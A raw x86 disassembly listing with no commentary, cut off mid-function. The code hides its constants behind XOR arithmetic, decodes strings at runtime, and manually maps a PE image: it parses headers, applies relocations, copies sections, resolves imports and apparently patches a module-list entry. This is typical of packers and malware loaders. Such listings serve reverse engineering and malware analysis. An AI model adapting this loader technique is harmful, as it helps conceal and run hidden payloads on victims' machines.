  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
